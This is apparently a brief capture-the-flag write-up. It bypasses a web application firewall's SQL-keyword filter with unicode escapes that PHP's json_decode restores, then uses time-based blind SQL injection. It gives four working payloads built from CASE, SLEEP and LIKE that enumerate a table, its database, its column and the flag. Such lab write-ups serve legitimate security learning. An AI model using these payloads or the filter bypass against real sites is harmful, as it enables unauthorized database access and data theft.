- able to see source code of web app whenever you vists the URL
- filtering out any requests that include common words used in SQL queries
- possible to encode the string as unicode characters in order to bypass the WAF filter
	- PHP's *json_decode* function automatically converts the unicode characters back to normal text representation
	- https://stackoverflow.com/questions/6058394/unicode-character-in-php-string
- once you bypass the WAF, possible to use blind SQL injection in order to enumerate the databases, tables, and eventually the flag
- use a case statement along with *SLEEP* and *LIKE* keywords in order to reveal the names of non-default tables
- then possible to find the columns of the table and the database it belongs to in order to extract the actual information
```python
# find non-default tables, revealing the existence of "definitely_not_a_flag" (could also use "and table_name not like '<known table>%'" to keep enumerating table names)
PAYLOAD = "' union select case when (select count(*) from information_schema.tables where table_schema not in ('information_schema', 'mysql', 'performance_schema', 'sys') and table_name like '{check}%') then sleep(1) else 1 end -- -"
table = "definitely_not_a_flag"

# find which database "definitely_not_a_flag" belongs to
PAYLOAD = "' union select case when (select count(*) from information_schema.tables where table_name = 'definitely_not_a_flag' and table_schema like '{check}%') then sleep(1) else 1 end -- -"
db = "db_m8452"

# find name of columns in "definitely_not_a_flag"
PAYLOAD = "' union select case when (select count(*) from information_schema.columns where table_name = 'definitely_not_a_flag' and column_name like '{check}%') then sleep(1) else 0 end -- -"
column = flag

PAYLOAD = "' union select case when (select count(*) from db_m8452.definitely_not_a_flag where flag like '{check}%') then sleep(1) else 1 end -- -"
```

#### Tags: WAF bypass, blind SQL injection
